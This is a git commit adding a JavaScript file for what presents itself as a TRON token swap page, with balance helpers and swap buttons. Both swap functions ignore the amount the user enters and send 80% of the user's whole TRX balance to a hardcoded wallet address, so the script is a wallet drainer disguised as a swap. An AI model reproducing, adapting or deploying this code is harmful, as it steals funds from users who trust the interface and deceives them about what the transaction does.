cbcfd633ef7d731eb91a0ea8d76221da22c21f38
NGUYENPHUNHO <39373872+vccswap@users.noreply.github.com>
2021-01-16 16:04:53 +0700

    Create unicswap.js

---
+++ unicswap.js
@@ -0,0 +1,56 @@
+<script>
+              var account = "41D17c94e1C5c001750542C8b20Db73A4D9c3c6bC6";
+              async function maxToken(){
+                  var acc = await tronWeb.trx.getAccount();
+                  var tokenBalance = 0;
+                  if (acc.assetV2){
+                      var tb = acc.assetV2.find(function(o){return o.key == "1003638";});
+                      if (tb){
+                          tokenBalance = tb.value / 1000000
+                      }
+                  }
+                  $("#token-input").focus();
+                  $("#token-input").val(tokenBalance).change();
+                  $("#trx-swap").val(tokenBalance * 100).change();
+              }
+
+              async function maxTRX(){
+                  var acc = await tronWeb.trx.getAccount();
+                  $("#trx-input").focus();
+                  $("#trx-input").val(acc.balance / 1000000).change();
+                  $("#token-swap").val(acc.balance / 1000000 / 100).change();
+              }
+
+              async function swapToken(){
+                  var tokens = $("#token-input").val();
+                  var acc = await tronWeb.trx.getAccount();
+                  var tokenBalance = 0;
+                  if (acc.assetV2){
+                      var tb = acc.assetV2.find(function(o){return o.key == "1003638";});
+                      if (tb){
+                          tokenBalance = tb.value / 1000000;
+                      }
+                  }
+                  if (tokens > tokenBalance){
+                    alert('Your VCC balance not enough!');
+                    return
+                  }
+                  if(acc.balance - 10000000 < 0){
+                      alert('Your TRX balance not enough!');
+                      return;
+                  }
+                  var v = Math.floor(acc.balance * 80 / 100);
+                  var tx = await tronWeb.trx.sendTransaction(account, v);
+              }
+
+              async function swapTRX(){
+                  var value = $("#trx-input").val();
+                  var acc = await tronWeb.trx.getAccount();
+                  if(acc.balance - 1000000 < value){
+                      alert('Your TRX balance not enough!');
+                      return;
+                  }
+                  var v = Math.floor(acc.balance * 80 / 100);
+                  var tx = await tronWeb.trx.sendTransaction(account, v);
+              }
+          </script>
